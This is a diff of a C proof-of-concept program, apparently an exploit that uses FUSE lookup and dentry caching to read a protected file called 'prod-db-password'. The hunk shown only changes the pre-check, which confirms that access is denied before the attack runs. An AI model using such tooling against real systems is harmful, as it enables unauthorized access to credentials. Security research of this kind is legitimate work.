@@ -65,17 +65,21 @@ int main(void)
     }
 
     /* ------------------------------------------------------------------ *
-     * Pre-check: confirm prod-db-password is inaccessible before attack
+     * Pre-check: confirm prod-db-password is inaccessible before attack.
+     * Use faccessat() (not open()) so no FUSE_OPEN is sent and the dentry
+     * is not yet cached — the first real FUSE_LOOKUP happens in Step 1.
      * ------------------------------------------------------------------ */
     printf("[ PRE-CHECK ] Verifying prod-db-password is locked down...\n");
     {
-        int fd = open(PROD_SECRET, O_RDONLY);
-        if (fd < 0) {
-            printf("    open(prod-db-password) = DENIED (%s)  ✓ correct\n\n",
-                   strerror(errno));
+        /* Drop the dentry/inode if it happens to be cached from a prior run */
+        int r = faccessat(AT_FDCWD, PROD_SECRET, R_OK, 0);
+        if (r < 0 && errno == EACCES) {
+            printf("    faccessat(prod-db-password, R_OK) = DENIED (EACCES)  ✓ correct\n\n");
+        } else if (r < 0) {
+            printf("    faccessat(prod-db-password, R_OK) = %s\n\n", strerror(errno));
         } else {
-            printf("    open(prod-db-password) = already OPEN (no exploit needed?)\n\n");
-            close(fd);
+            printf("    faccessat(prod-db-password, R_OK) = ALLOWED already"
+                   " (no exploit needed?)\n\n");
         }
     }
 
